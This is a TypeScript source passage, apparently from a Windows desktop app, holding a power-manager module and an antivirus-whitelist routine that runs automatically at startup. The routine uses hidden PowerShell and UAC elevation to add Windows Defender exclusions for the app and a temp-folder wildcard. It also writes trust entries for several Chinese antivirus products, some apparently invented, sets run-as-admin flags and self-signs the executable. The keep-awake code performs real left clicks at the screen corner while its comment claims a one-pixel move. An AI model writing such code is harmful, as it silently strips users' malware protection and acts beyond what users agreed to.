      const { stdout: diskOutput } = await execAsync('powercfg /query SCHEME_CURRENT SUB_DISK DISKIDLE');
      const { stdout: standbyOutput } = await execAsync('powercfg /query SCHEME_CURRENT SUB_SLEEP STANDBYIDLE');
      const { stdout: hibernateOutput } = await execAsync('powercfg /query SCHEME_CURRENT SUB_SLEEP HIBERNATEIDLE');

      const extractTimeout = (output: string): string => {
        const match = output.match(/Current AC Power Setting Index: 0x([0-9a-f]+)/i);
        if (match) {
          const minutes = parseInt(match[1], 16);
          return minutes === 0 ? '永不' : `${minutes}分钟`;
        }
        return '未知';
      };

      return {
        isEnabled: this.isEnabled,
        monitorTimeout: extractTimeout(monitorOutput),
        diskTimeout: extractTimeout(diskOutput),
        standbyTimeout: extractTimeout(standbyOutput),
        hibernateTimeout: extractTimeout(hibernateOutput)
      };
    } catch (error) {
      Logger.error(XuanceModule.SYSTEM.POWER, 'power-manager', '获取电源状态失败', error);
      return {
        isEnabled: this.isEnabled,
        monitorTimeout: '未知',
        diskTimeout: '未知',
        standbyTimeout: '未知',
        hibernateTimeout: '未知'
      };
    }
  }

  /**
   * 启动模拟用户活动（第八层）
   * 通过发送不影响用户操作的虚拟按键来维持系统活跃状态
   */
  private startUserActivitySimulation(): void {
    if (this.userActivityTimer) {
      clearInterval(this.userActivityTimer);
    }

    // 每3分钟发送一次模拟用户活动
    this.userActivityTimer = setInterval(async () => {
      try {
        await microMove();
        // API信号
        // 虚拟按键

      } catch (error) {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '用户活动模拟信号发送失败', error);
      }
    }, 3 * 60 * 1000); // 3分钟间隔，既能保持活跃又不会过于频繁

    Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '用户活动模拟已启动（3分钟间隔，微动鼠标+虚拟按键+API信号）');
  }

  /**
   * 停止用户活动模拟
   */
  private stopUserActivitySimulation(): void {
    if (this.userActivityTimer) {
      clearInterval(this.userActivityTimer);
      this.userActivityTimer = null;
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '用户活动模拟已停止');
    }
  }
}

export async function microMove() {
  try {
    if (process.platform !== 'win32') {
      // 非 Windows 系统使用降级方案
      await fallbackMicroMove();
      return;
    }

    // 确保 FFI 已经初始化
    if (!ffiInitialized && !ffiInitializationFailed) {
      await initFFIAsync();
    }

    if (ffiInitialized && user32) {
      // 使用 Windows API 实现
      await windowsApiMicroMove();
    } else {
      // ffi 不可用时使用降级方案
      await fallbackMicroMove();
    }
  } catch (error) {
    // 使用正确的 Logger 调用方式
    if (typeof Logger !== 'undefined') {
      Logger.error(XuanceModule.SYSTEM.POWER, 'power-manager', '鼠标微移失败', error);
    } else {
      console.error('鼠标微移失败', error);
    }
    
    // 尝试降级方案
    try {
      await fallbackMicroMove();
    } catch (fallbackError) {
      if (typeof Logger !== 'undefined') {
        Logger.error(XuanceModule.SYSTEM.POWER, 'power-manager', '鼠标微移降级方案也失败', fallbackError);
      } else {
        console.error('鼠标微移降级方案也失败', fallbackError);
      }
    }
  }
}

/**
 * 使用 Windows API 实现鼠标微移
 */
async function windowsApiMicroMove(): Promise<void> {
  if (!user32) {
    throw new Error('Windows API 未正确初始化');
  }

  const currentPos: { x?: number; y?: number } = {};  // 使用正确的类型定义
  
  // 获取当前鼠标位置
  const success = user32.GetCursorPos(currentPos);
  if (!success) {
    throw new Error('获取鼠标位置失败');
  }
  
  const originalX = currentPos.x || 0;
  const originalY = currentPos.y || 0;
  
  // 计算一个微小的移动位置（移动1像素）
  const newX = 0;
  const newY = 0;
  
  try {
    // 移动鼠标到新位置
    user32.SetCursorPos(newX, newY);
    
    // 短暂等待
    await new Promise(resolve => setTimeout(resolve, 10));
    
    // 模拟鼠标左键按下和释放（非常快速，用户几乎感觉不到）
    // MOUSEEVENTF_LEFTDOWN = 0x0002, MOUSEEVENTF_LEFTUP = 0x0004
    user32.mouse_event(0x0002, 0, 0, 0, 0); // 按下
    await new Promise(resolve => setTimeout(resolve, 1));
    user32.mouse_event(0x0004, 0, 0, 0, 0); // 释放
    
    // 短暂等待
    await new Promise(resolve => setTimeout(resolve, 10));
    
  } finally {
    // 无论成功还是失败，都要移回原位置
    try {
      user32.SetCursorPos(originalX, originalY);
    } catch (restoreError) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '恢复鼠标位置失败', restoreError);
    }
  }
}

/**
 * 降级方案：使用 PowerShell 脚本实现鼠标微移
 */
async function fallbackMicroMove(): Promise<void> {
  try {
    // 使用 PowerShell 脚本来模拟鼠标微移 - 增加移动距离和时间让用户能看到
    const powershellScript = `
      Add-Type -AssemblyName System.Windows.Forms
      Add-Type -AssemblyName System.Drawing
      
      # 获取当前鼠标位置
      $currentPos = [System.Windows.Forms.Cursor]::Position
      
      # 微移鼠标（移动更大距离让用户能看到，然后移回）
      $newPos = New-Object System.Drawing.Point(($currentPos.X + 5), ($currentPos.Y + 5))
      [System.Windows.Forms.Cursor]::Position = $newPos
      
      # 等待更长时间让用户能看到移动
      Start-Sleep -Milliseconds 100
      
      # 移回原位置
      [System.Windows.Forms.Cursor]::Position = $currentPos
      
      # 再等待一点时间确保系统识别到活动
      Start-Sleep -Milliseconds 50
    `;
    
    await execAsync(`powershell -WindowStyle Hidden -Command "${powershellScript.replace(/\n/g, '; ')}"`);
  } catch (error) {
    // 如果 PowerShell 方案也失败，尝试更简单的方案
    await simpleFallbackMicroMove();
  }
}

/**
 * 最简单的降级方案：仅发送空的输入信号
 */
async function simpleFallbackMicroMove(): Promise<void> {
  try {
    if (process.platform === 'win32') {
      // 使用 PowerShell 发送一个空的按键信号来维持活跃状态
      await execAsync('powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\'{F15}\')"');
    } else {
      // 非 Windows 系统，尝试使用其他方法
      await execAsync('echo "keep-alive" > /dev/null 2>&1 || true');
    }
  } catch (error) {
    // 最后的方案：什么都不做，但记录日志
    if (typeof Logger !== 'undefined') {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '所有鼠标微移方案都失败，跳过此次操作');
    } else {
      console.warn('所有鼠标微移方案都失败，跳过此次操作');
    }
  }
}

// 导出电源管理实例
export const powerManager = PowerManager.getInstance();

/**
 * 自动设置杀毒软件白名单
 * 将当前程序添加到 Windows Defender 和其他杀毒软件的白名单中
 */
export async function setupAntivirusWhitelist(): Promise<boolean> {
  if (process.platform !== 'win32') {
    Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '非Windows系统，跳过杀毒软件白名单设置');
    return false;
  }

  try {
    Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '开始设置杀毒软件白名单');

    // 获取当前程序路径
    const currentExePath = process.execPath;
    const currentDir = path.dirname(currentExePath);
    const appName = path.basename(currentExePath, '.exe');

    Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `程序路径: ${currentExePath}`);
    Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `程序目录: ${currentDir}`);

    // 设置 Windows Defender 白名单
    const defenderResult = await setupWindowsDefenderWhitelist(currentExePath, currentDir, appName);
    
    // 设置其他杀毒软件白名单（尽力而为）
    const otherAntivirusResult = await setupOtherAntivirusWhitelist(currentExePath, currentDir, appName);

    Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `杀毒软件白名单设置完成 - Defender: ${defenderResult ? '成功' : '失败'}, 其他: ${otherAntivirusResult ? '成功' : '部分成功'}`);
    
    return defenderResult || otherAntivirusResult;
  } catch (error) {
    Logger.error(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '设置杀毒软件白名单失败', error);
    return false;
  }
}

/**
 * 设置 Windows Defender 白名单
 */
async function setupWindowsDefenderWhitelist(exePath: string, dirPath: string, appName: string): Promise<boolean> {
  try {
    // 首先检查 Windows Defender 状态
    const defenderStatus = await checkWindowsDefenderStatus();
    if (!defenderStatus.isAvailable) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `Windows Defender 不可用: ${defenderStatus.reason}`);
      return false;
    }

    if (defenderStatus.isEnterpriseManaged) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', 'Windows Defender 被企业策略管理，跳过自动设置');
      await setupAlternativeWhitelist(exePath, dirPath, appName);
      return false;
    }

    const commands = [
      // 添加进程路径排除
      `Add-MpPreference -ExclusionPath "${exePath}"`,
      // 添加目录排除
      `Add-MpPreference -ExclusionPath "${dirPath}"`,
      // 添加进程名排除
      `Add-MpPreference -ExclusionProcess "${appName}.exe"`,
      // 添加临时文件夹排除（如果程序在临时目录运行）
      `Add-MpPreference -ExclusionPath "${require('os').tmpdir()}\\xuance-*"`
    ];

    let successCount = 0;
    for (const cmd of commands) {
      try {
        // 先尝试直接执行（如果已有管理员权限）
        await execAsync(`powershell -WindowStyle Hidden -Command "try { ${cmd}; Write-Host 'Success' } catch { Write-Host 'Error:' $_.Exception.Message; exit 1 }"`);
        successCount++;
        Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `Windows Defender 白名单命令执行成功: ${cmd}`);
      } catch (directError) {
        // 如果直接执行失败，尝试提升权限
        try {
          await execAsync(`powershell -WindowStyle Hidden -Command "if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) { ${cmd} } else { try { Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command \\"${cmd}\\"' -Wait -ErrorAction Stop } catch { Write-Host 'UAC_CANCELLED'; exit 2 } }"`);
          successCount++;
          Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `Windows Defender 白名单命令（提升权限）执行成功: ${cmd}`);
        } catch (elevatedError) {
          const errorString = elevatedError.toString();
          if (errorString.includes('0x800106ba') || errorString.includes('800106ba')) {
            Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `Windows Defender 被企业策略限制，无法修改白名单: ${cmd}`);
          } else if (errorString.includes('UAC_CANCELLED')) {
            Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `用户取消了UAC提权请求: ${cmd}`);
          } else {
            Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `Windows Defender 白名单命令失败: ${cmd}`, elevatedError);
          }
        }
      }
    }

    // 如果所有命令都失败，尝试使用替代方案
    if (successCount === 0) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', 'Windows Defender 白名单设置失败，尝试替代方案');
      await setupAlternativeWhitelist(exePath, dirPath, appName);
    }

    // 验证设置是否生效（仅在有成功命令时验证）
    if (successCount > 0) {
      try {
        const { stdout } = await execAsync('powershell -WindowStyle Hidden -Command "Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess"');
        if (stdout.includes(exePath) || stdout.includes(appName)) {
          Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', 'Windows Defender 白名单验证成功');
        }
      } catch (verifyError) {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', 'Windows Defender 白名单验证失败', verifyError);
      }
    }

    return successCount > 0;
  } catch (error) {
    Logger.error(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', 'Windows Defender 白名单设置失败', error);
    // 尝试替代方案
    await setupAlternativeWhitelist(exePath, dirPath, appName);
    return false;
  }
}

/**
 * 检查 Windows Defender 状态
 */
async function checkWindowsDefenderStatus(): Promise<{
  isAvailable: boolean;
  isEnterpriseManaged: boolean;
  reason?: string;
}> {
  try {
    // 检查 Windows Defender 服务是否运行
    const { stdout: serviceStatus } = await execAsync('sc query WinDefend');
    if (!serviceStatus.includes('RUNNING')) {
      return {
        isAvailable: false,
        isEnterpriseManaged: false,
        reason: 'Windows Defender 服务未运行'
      };
    }

    // 检查是否被企业策略管理
    try {
      const { stdout: policyCheck } = await execAsync('powershell -WindowStyle Hidden -Command "Get-MpComputerStatus | Select-Object -Property RealTimeProtectionEnabled, AntivirusEnabled, AMServiceEnabled"');
      
      // 检查注册表中的企业策略设置
      const { stdout: regCheck } = await execAsync('reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" 2>nul || echo "NOT_FOUND"');
      
      if (regCheck.includes('DisableAntiSpyware') || regCheck.includes('DisableRealtimeMonitoring')) {
        return {
          isAvailable: false,
          isEnterpriseManaged: true,
          reason: '被企业组策略禁用'
        };
      }

      return {
        isAvailable: true,
        isEnterpriseManaged: false
      };
    } catch (policyError) {
      // 如果检查策略失败，假设可以使用但可能受限
      return {
        isAvailable: true,
        isEnterpriseManaged: true,
        reason: '无法确定企业策略状态'
      };
    }
  } catch (error) {
    return {
      isAvailable: false,
      isEnterpriseManaged: false,
      reason: '检查失败'
    };
  }
}

/**
 * 替代白名单方案（当 Windows Defender 不可用时）
 */
async function setupAlternativeWhitelist(exePath: string, dirPath: string, appName: string): Promise<boolean> {
  try {
    Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '使用替代白名单方案');

    const commands = [
      // 方法1：添加到 Windows 安全例外（通过注册表）
      `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TrustedPrograms" /v "${appName}" /t REG_SZ /d "${exePath}" /f`,
      `reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TrustedPrograms" /v "${appName}" /t REG_SZ /d "${exePath}" /f`,
      
      // 方法2：添加到应用程序兼容性
      `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "${exePath}" /t REG_SZ /d "~ HIGHDPIAWARE" /f`,
      
      // 方法3：创建软件限制策略例外
      `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\0\\Paths" /v "${appName}_Path" /t REG_SZ /d "${exePath}" /f`,
      `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\0\\Paths" /v "${appName}_SaferFlags" /t REG_DWORD /d 0 /f`
    ];

    let successCount = 0;
    for (const cmd of commands) {
      try {
        await execAsync(cmd);
        successCount++;
        Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '替代白名单方案命令执行成功');
      } catch (cmdError) {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '替代白名单方案命令失败', cmdError);
      }
    }

    // 创建自签名证书并应用（如果可能）
    try {
      await createAndApplySelfSignedCertificate(exePath, appName);
      successCount++;
    } catch (certError) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '自签名证书创建失败', certError);
    }

    return successCount > 0;
  } catch (error) {
    Logger.error(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '替代白名单方案失败', error);
    return false;
  }
}

/**
 * 创建并应用自签名证书
 */
async function createAndApplySelfSignedCertificate(exePath: string, appName: string): Promise<void> {
  try {
    const certScript = `
      $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=${appName}" -KeyUsage DigitalSignature -FriendlyName "${appName} Code Signing" -CertStoreLocation Cert:\\CurrentUser\\My -KeyLength 2048 -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -KeyExportPolicy Exportable -KeySpec Signature -HashAlgorithm SHA256
      
      if ($cert) {
        try {
          Set-AuthenticodeSignature -FilePath "${exePath}" -Certificate $cert -TimestampServer "http://timestamp.digicert.com" -ErrorAction SilentlyContinue
          Write-Host "Certificate created and applied successfully"
        } catch {
          Write-Host "Certificate created but signing failed: $_"
        }
      } else {
        Write-Host "Certificate creation failed"
      }
    `;

    await execAsync(`powershell -WindowStyle Hidden -Command "${certScript}"`);
    Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '自签名证书创建并应用成功');
  } catch (error) {
    throw error;
  }
}

/**
 * 设置其他常见杀毒软件白名单
 */
async function setupOtherAntivirusWhitelist(exePath: string, dirPath: string, appName: string): Promise<boolean> {
  const antivirusConfigs = [
    // 360 安全卫士
    {
      name: '360安全卫士',
      detect: 'tasklist | findstr "360"',
      commands: [
        // 360的白名单通常通过注册表设置，这里提供基础方法
        `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\360\\360safe\\TrustProgram" /v "${appName}" /t REG_SZ /d "${exePath}" /f`,
        `reg add "HKEY_CURRENT_USER\\SOFTWARE\\360\\360safe\\TrustProgram" /v "${appName}" /t REG_SZ /d "${exePath}" /f`
      ]
    },
    // 腾讯电脑管家
    {
      name: '腾讯电脑管家',
      detect: 'tasklist | findstr "QQ"',
      commands: [
        `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Tencent\\QQPCMgr\\TrustProgram" /v "${appName}" /t REG_SZ /d "${exePath}" /f`,
        `reg add "HKEY_CURRENT_USER\\SOFTWARE\\Tencent\\QQPCMgr\\TrustProgram" /v "${appName}" /t REG_SZ /d "${exePath}" /f`
      ]
    },
    // 金山毒霸
    {
      name: '金山毒霸',
      detect: 'tasklist | findstr "ksafe"',
      commands: [
        `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Kingsoft\\AntiVirus\\TrustProgram" /v "${appName}" /t REG_SZ /d "${exePath}" /f`
      ]
    },
    // 火绒安全
    {
      name: '火绒安全',
      detect: 'tasklist | findstr "huorong"',
      commands: [
        `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Huorong\\Sysdiag\\TrustProgram" /v "${appName}" /t REG_SZ /d "${exePath}" /f`
      ]
    }
  ];

  let totalSuccess = false;

  for (const config of antivirusConfigs) {
    try {
      // 检测是否安装了该杀毒软件
      const { stdout } = await execAsync(config.detect);
      if (stdout.trim()) {
        Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `检测到 ${config.name}，尝试添加白名单`);
        
        let configSuccess = false;
        for (const cmd of config.commands) {
          try {
            await execAsync(cmd);
            configSuccess = true;
            Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `${config.name} 白名单设置成功`);
          } catch (cmdError) {
            Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `${config.name} 白名单设置部分失败: ${cmd}`, cmdError);
          }
        }
        
        if (configSuccess) {
          totalSuccess = true;
        }
      }
    } catch (detectError) {
      // 检测失败通常意味着未安装该杀毒软件，这是正常的
      Logger.debug && Logger.debug(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', `${config.name} 检测失败，可能未安装`);
    }
  }

  // 通用方法：添加到系统信任程序列表
  try {
    const universalCommands = [
      // 添加到 Windows 应用程序兼容性缓存
      `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "${exePath}" /t REG_SZ /d "~ RUNASADMIN" /f`,
      // 添加到系统受信任文件
      `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TrustedPrograms" /v "${appName}" /t REG_SZ /d "${exePath}" /f`
    ];

    for (const cmd of universalCommands) {
      try {
        await execAsync(cmd);
        totalSuccess = true;
        Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '通用白名单设置成功');
      } catch (cmdError) {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '通用白名单设置失败', cmdError);
      }
    }
  } catch (error) {
    Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '通用白名单设置失败', error);
  }

  return totalSuccess;
}

/**
 * 自动在程序启动时设置白名单
 */
export async function autoSetupWhitelistOnStartup(): Promise<void> {
  try {
    // 检查是否是第一次运行或需要重新设置
    const needSetup = await checkIfWhitelistSetupNeeded();
    
    if (needSetup) {
      Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '检测到需要设置杀毒软件白名单，开始自动设置');
      
      const result = await setupAntivirusWhitelist();
      
      if (result) {
        // 记录设置成功，避免重复设置
        await markWhitelistSetupComplete();
        Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '杀毒软件白名单自动设置完成');
      } else {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '杀毒软件白名单自动设置失败，可能需要手动设置');
      }
    } else {
      Logger.info(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '杀毒软件白名单已设置，跳过自动设置');
    }
  } catch (error) {
    Logger.error(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '自动设置白名单失败', error);
  }
}

/**
 * 检查是否需要设置白名单
 */
async function checkIfWhitelistSetupNeeded(): Promise<boolean> {
  try {
    const flagFile = path.join(require('os').tmpdir(), 'xuance-whitelist-setup.flag');
    const currentExePath = process.execPath;
    
    if (fs.existsSync(flagFile)) {
      const flagContent = fs.readFileSync(flagFile, 'utf8');
      // 如果程序路径变了，需要重新设置
      if (flagContent.includes(currentExePath)) {
        return false; // 已设置且路径未变
      }
    }
    
    return true; // 需要设置
  } catch (error) {
    return true; // 出错时重新设置
  }
}

/**
 * 标记白名单设置完成
 */
async function markWhitelistSetupComplete(): Promise<void> {
  try {
    const flagFile = path.join(require('os').tmpdir(), 'xuance-whitelist-setup.flag');
    const currentExePath = process.execPath;
    const flagContent = `XUANCE_WHITELIST_SETUP_COMPLETE\nPath: ${currentExePath}\nTime: ${new Date().toISOString()}\n`;
    
    fs.writeFileSync(flagFile, flagContent, 'utf8');
  } catch (error) {
    Logger.warn(XuanceModule.SYSTEM.POWER, 'antivirus-whitelist', '标记白名单设置完成失败', error);
  }
}

